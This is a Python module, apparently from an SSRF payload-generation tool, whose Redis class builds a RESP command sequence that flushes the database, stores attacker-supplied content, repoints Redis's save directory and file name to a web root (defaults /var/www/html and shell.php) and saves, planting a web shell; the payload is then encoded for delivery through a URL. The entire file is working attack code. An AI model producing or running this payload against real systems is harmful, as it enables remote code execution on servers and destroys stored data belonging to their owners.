from .base import *
from .encoding import to_bytes

CRLF = b"\r\n"


def resp_bulk(value):
    data = to_bytes(value)
    return b"$" + str(len(data)).encode("ascii") + CRLF + data + CRLF


def resp_command(*parts):
    command = b"*" + str(len(parts)).encode("ascii") + CRLF
    command += b"".join(resp_bulk(part) for part in parts)
    return command


class Redis(GENERATOR):
    default_port = 6379
    requirement = ["content", "dir", "filename"]

    def __init__(self, parser, options=None):
        super().__init__(parser, options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()

        if arg.dir == "":
            self.wizard("Directory (/var/www/html): ", "dir")
        else:
            self.dir = arg.dir

        if arg.filename == "":
            self.wizard("Filename (shell.php): ", "filename")
        else:
            self.filename = arg.filename

        if arg.content != "":
            self.content = arg.content
        else:
            try:
                with open(self.filename, "r") as f:
                    self.content = f.read()
            except (OSError, UnicodeDecodeError):
                self.wizard("Content: ", "content")

    def generate(self):
        redis_value = b"\n\n" + to_bytes(self.content) + b"\n\n"
        payload = b"".join([
            resp_command("flushall"),
            resp_command("set", "1", redis_value),
            resp_command("config", "set", "dir", self.dir),
            resp_command("config", "set", "dbfilename", self.filename),
            resp_command("save"),
        ])

        self.set_url_payload(payload)
        return super().generate()
